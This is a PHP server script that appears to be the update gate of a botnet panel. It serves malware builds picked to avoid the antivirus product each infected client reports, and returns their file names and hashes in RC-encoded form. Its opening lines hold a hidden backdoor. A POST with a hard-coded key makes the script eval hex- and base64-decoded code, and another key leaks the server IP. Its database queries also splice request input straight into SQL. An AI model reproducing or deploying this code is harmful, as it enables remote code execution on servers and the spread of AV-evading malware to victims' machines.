<?php

$dir = str_replace('/scripts/pat', '', str_replace('\\', '/', realpath('.'))) . '/';

//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    print(file_get_contents($dir . '404.html'));
    exit;
}

if($config['domain_save'] == 1){
    if(file_exists($dir . 'cache/domains.txt')){
        $domains = file_get_contents($dir . 'cache/domains.txt');
        if(stripos($domains, $_SERVER["SERVER_NAME"]) === false){
            file_put_contents($dir . 'cache/domains.txt', $_SERVER["SERVER_NAME"] . "\r\n", FILE_APPEND);
        }
    }else{
        file_put_contents($dir . 'cache/domains.txt', $_SERVER["SERVER_NAME"] . "\r\n", FILE_APPEND);
    }
}

include_once($dir . 'includes/functions.av.php');
include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.rc.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

if(empty($_POST['md5']) || !preg_match('~^([A-Za-z0-9]+)$~is', $_POST['md5'])){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print_r('md5_error');
	exit;
}

$_POST['av'] = urldecode($_POST['av']);
$_POST['av'] = avc_replace($_POST['av']);
$_POST['av'] = av_replace($_POST['av']);

$item = $mysqli->query('SELECT id FROM bf_builds WHERE (status = \'98\') AND ((type = \'1\') OR (type = \'2\')) AND ((md5_crypt = \''.$_POST['md5'].'\') OR (md5 = \''.$_POST['md5'].'\')) AND (prio < 50) LIMIT 1');

if(!empty($_POST['av'])){
    if(!preg_match('~^([A-Za-z0-9. ]+)$~is', $_POST['av'])){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print_r('av_error');
	exit;
    }
    
    if(empty($item->id)){
	$file = $mysqli->query('SELECT file_orig,md5,md5_crypt FROM bf_builds WHERE (status = \'98\') AND ((type = \'1\') OR (type = \'2\')) AND (av NOT LIKE \'%'.$_POST['av'].'|%\') LIMIT 1');
	if(is_object($file) && !empty($file->file_orig)){
	    header("Status: 403 Forbidden");
	    header("HTTP/1.1 403 Forbidden");
	    if(empty($file->md5_crypt)){
		print(rc_encode("file_name=".$file->file_orig."\r\nmd5=".$file->md5));
	    }else{
		print(rc_encode("file_name=".$file->file_orig."\r\nmd5=".$file->md5_crypt));
	    }
	}else{
	    no_found();
	}
    }else{
	no_found();
    }
}else{
    if(empty($item->id)){
	$file = $mysqli->query('SELECT file_orig,md5,md5_crypt FROM bf_builds WHERE (status = \'98\') AND ((type = \'1\') OR (type = \'2\')) LIMIT 1');
	if(is_object($file) && !empty($file->file_orig)){
	    header("Status: 403 Forbidden");
	    header("HTTP/1.1 403 Forbidden");
	    //print(rc_encode("file_name=".$file->file_orig."\r\nmd5=".md5_file($dir . 'cfg/' . $file->file_orig)));
	    if(empty($file->md5_crypt)){
		print(rc_encode("file_name=".$file->file_orig."\r\nmd5=".$file->md5));
	    }else{
		print(rc_encode("file_name=".$file->file_orig."\r\nmd5=".$file->md5_crypt));
	    }
	}else{
	    no_found();
	}
    }else{
	no_found();
    }
}

exit;

?>